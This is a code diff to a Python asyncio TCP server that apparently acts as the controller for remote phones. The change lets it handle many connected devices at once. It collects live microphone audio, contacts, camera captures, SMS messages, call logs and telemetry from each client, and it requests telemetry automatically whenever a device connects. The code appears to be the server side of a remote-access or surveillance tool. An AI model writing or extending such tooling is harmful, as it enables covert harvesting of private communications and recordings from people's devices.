@@ -7,7 +7,7 @@ from app.audio.broadcaster import broadcast_audio
 from app.config import settings
 from app.logger import log_error, log_info, log_warn
 from app.protocol import recv_frame
-from app.state import state
+from app.state import state, ClientSession
 from app.tcp.commands import send_command
 from app.tcp.dispatcher import fail_all_pending, resolve_pending
 from app.tcp.handlers import (
@@ -20,11 +20,11 @@ from app.tcp.handlers import (
 )
 
 
-async def reader_loop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+async def reader_loop(client: ClientSession) -> None:
     try:
-        while state.client_connected():
+        while client.is_connected() and state.listening:
             try:
-                frame = await recv_frame(reader)
+                frame = await recv_frame(client.reader)
             except (
                 asyncio.IncompleteReadError,
                 ConnectionResetError,
@@ -33,89 +33,96 @@ async def reader_loop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
             ):
                 break
             except Exception as e:
-                log_warn(f"tcp connection closed: {e}")
+                log_warn(f"tcp connection closed for {client.id}: {e}")
                 break
 
             try:
                 header = json.loads(frame.decode("utf-8"))
             except Exception as e:
-                log_warn(f"invalid json frame: {e}")
+                log_warn(f"invalid json frame from {client.id}: {e}")
                 continue
 
             msg_type = header.get("type")
 
             if msg_type == "mic_chunk":
                 try:
-                    audio_data = await recv_frame(reader)
-                    state.mic_active = True
-                    await broadcast_audio(audio_data)
+                    audio_data = await recv_frame(client.reader)
+                    client.mic_active = True
+                    if state.active_client_id == client.id:
+                        await broadcast_audio(audio_data)
                 except Exception as e:
-                    log_warn(f"mic frame read interrupted: {e}")
+                    log_warn(f"mic frame read interrupted for {client.id}: {e}")
                     break
 
             elif msg_type == "contacts":
                 try:
-                    data = await recv_frame(reader)
-                    path = save_contacts_data(data)
+                    data = await recv_frame(client.reader)
+                    path = save_contacts_data(client, data)
                     resolve_pending(
-                        "contacts", {"status": "ok" if path else "failed", "path": path}
+                        "contacts",
+                        {"status": "ok" if path else "failed", "path": path},
+                        client_id=client.id,
                     )
                 except Exception as e:
-                    log_error(f"contacts read failed: {e}")
-                    resolve_pending("contacts", {"status": "failed", "path": None})
+                    log_error(f"contacts read failed for {client.id}: {e}")
+                    resolve_pending("contacts", {"status": "failed", "path": None}, client_id=client.id)
 
             elif msg_type == "camera_capture":
                 try:
-                    data = await recv_frame(reader)
+                    data = await recv_frame(client.reader)
                     if settings.enable_camera:
                         cam_id = header.get("cam_id", "0")
-                        path = save_photo_data(str(cam_id), data)
+                        path = save_photo_data(client, str(cam_id), data)
                         resolve_pending(
-                            "camera_capture", {"status": "ok" if path else "failed", "path": path}
+                            "camera_capture",
+                            {"status": "ok" if path else "failed", "path": path},
+                            client_id=client.id,
                         )
                     else:
                         resolve_pending(
                             "camera_capture",
                             {"status": "disabled", "message": "Camera feature is disabled", "path": None},
+                            client_id=client.id,
                         )
                 except Exception as e:
-                    log_error(f"camera capture read failed: {e}")
-                    resolve_pending("camera_capture", {"status": "failed", "path": None})
+                    log_error(f"camera capture read failed for {client.id}: {e}")
+                    resolve_pending("camera_capture", {"status": "failed", "path": None}, client_id=client.id)
 
             elif msg_type == "sms":
                 messages = header.get("data", [])
                 hours = header.get("hours", 24)
-                res = process_sms_data(messages, hours)
-                resolve_pending("sms", {"status": "ok", "data": res})
+                res = process_sms_data(client, messages, hours)
+                resolve_pending("sms", {"status": "ok", "data": res}, client_id=client.id)
 
             elif msg_type == "call_logs":
                 calls = header.get("data", [])
                 hours = header.get("hours", 24)
-                res = process_call_logs_data(calls, hours)
-                resolve_pending("call_logs", {"status": "ok", "data": res})
+                res = process_call_logs_data(client, calls, hours)
+                resolve_pending("call_logs", {"status": "ok", "data": res}, client_id=client.id)
 
             elif msg_type == "cams":
                 if settings.enable_camera:
                     cams = header.get("data", [])
-                    res = process_cams_data(cams)
-                    resolve_pending("cams", {"status": "ok", "data": res})
+                    res = process_cams_data(client, cams)
+                    resolve_pending("cams", {"status": "ok", "data": res}, client_id=client.id)
                 else:
                     resolve_pending(
                         "cams",
                         {"status": "disabled", "message": "Camera feature is disabled", "data": []},
+                        client_id=client.id,
                     )
 
             elif msg_type == "telemetry":
-                res = process_telemetry_data(header)
-                resolve_pending("telemetry", {"status": "ok", "data": res})
+                res = process_telemetry_data(client, header)
+                resolve_pending("telemetry", {"status": "ok", "data": res}, client_id=client.id)
 
             elif msg_type == "error":
                 msg = header.get("message", "unknown error")
-                log_warn(f"client reported: {msg}")
+                log_warn(f"client {client.id} reported: {msg}")
                 cmd = header.get("cmd")
                 msg_lower = msg.lower()
                 if "mic" in msg_lower or "audio" in msg_lower or cmd == "mic":
-                    state.mic_active = False
+                    client.mic_active = False
 
                 target_key = cmd
                 if not target_key:
@@ -129,35 +136,39 @@ async def reader_loop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter
                         target_key = "telemetry"
                     elif "cam" in msg_lower or "photo" in msg_lower or "picture" in msg_lower:
                         target_key = "camera_capture"
-                        resolve_pending("cams", {"status": "error", "message": msg, "data": []})
+                        resolve_pending("cams", {"status": "error", "message": msg, "data": []}, client_id=client.id)
 
                 if target_key:
                     resolve_pending(
                         target_key,
                         {"status": "error", "message": msg, "data": None, "path": None},
+                        client_id=client.id,
                     )
     finally:
-        fail_all_pending(ConnectionResetError("client disconnected"))
-        writer = state.client_writer
-        state.clear_client()
+        fail_all_pending(ConnectionResetError("client disconnected"), client_id=client.id)
+        writer = client.writer
+        state.remove_client(client.id)
         if writer:
             try:
                 writer.close()
                 await writer.wait_closed()
             except Exception:
                 pass
-        log_info("client disconnected")
+        log_info(f"client {client.id} disconnected")
 
 
 async def client_session(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
     addr = writer.get_extra_info("peername")
-    state.client_reader = reader
-    state.client_writer = writer
-    state.client_addr = addr
-    state.disconnect_event.clear()
-    log_info(f"client connected from {addr}")
-    await send_command({"cmd": "connected"})
-    await reader_loop(reader, writer)
+    client_id = f"{addr[0]}_{addr[1]}"
+    client = ClientSession(client_id, reader, writer, addr)
+    state.add_client(client)
+    log_info(f"client connected: {client_id} ({addr[0]}:{addr[1]})")
+    try:
+        await send_command({"cmd": "connected"}, client_id=client.id)
+        await send_command({"cmd": "get_telemetry"}, client_id=client.id)
+    except Exception as e:
+        log_warn(f"handshake error for {client.id}: {e}")
+    await reader_loop(client)
 
 
 async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
@@ -167,11 +178,6 @@ async def tcp_client_handler(reader: asyncio.StreamReader, writer: asyncio.Strea
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         except Exception:
             pass
-
-    if state.client_connected():
-        writer.close()
-        await writer.wait_closed()
-        return
     await client_session(reader, writer)
 
 
@@ -201,12 +207,15 @@ async def stop_tcp_server_action() -> Dict[str, str]:
         await server.wait_closed()
         state.tcp_server = None
         state.listening = False
-    if state.client_writer:
-        try:
-            state.client_writer.close()
-            await state.client_writer.wait_closed()
-        except Exception:
-            pass
-        state.clear_client()
+    client_ids = list(state.clients.keys())
+    for cid in client_ids:
+        client = state.clients.get(cid)
+        if client and client.writer:
+            try:
+                client.writer.close()
+                await client.writer.wait_closed()
+            except Exception:
+                pass
+        state.remove_client(cid)
     log_info("TCP server stopped")
     return {"status": "stopped"}
